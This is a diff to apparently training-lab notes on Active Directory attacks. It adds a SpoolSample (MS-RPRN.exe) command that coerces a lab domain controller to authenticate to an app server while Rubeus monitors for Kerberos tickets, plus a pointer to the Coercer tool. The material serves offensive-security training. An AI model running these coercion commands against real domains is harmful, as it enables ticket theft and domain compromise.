@@ -159,5 +159,11 @@ C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-
 ```powershell
 Rubeus.exe monitor /interval:5 /nowrap
 ```
-- And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on the student VM:
+- And after that run [MS-RPRN.exe](https://github.com/leechristensen/SpoolSample) on the student VM:
+```powershell
+MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local
+\\dcorp-appsrv.dollarcorp.moneycorp.local
+```
 
+- From a Linux machine: [Coercer](https://github.com/p0dalirius/Coercer) for other MS protocols that can be abused for coercion.
+- 
